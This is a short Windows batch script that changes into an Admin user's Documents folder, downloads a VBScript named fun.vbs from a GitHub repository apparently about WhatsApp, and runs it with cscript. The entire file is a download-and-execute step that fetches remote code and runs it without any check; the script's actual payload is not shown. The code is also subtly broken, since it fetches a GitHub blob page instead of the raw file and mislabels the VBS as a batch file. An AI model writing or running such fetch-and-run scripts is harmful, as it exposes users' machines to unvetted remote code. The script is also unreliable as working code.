@echo off
REM Navigate to the desired directory
cd C:\Users\Admin\Documents

REM Download the batch file from GitHub
curl -O https://github.com/Voilater/fun_with_whatsapp/blob/main/fun.vbs

REM Execute the downloaded batch file
cscript fun.vbs
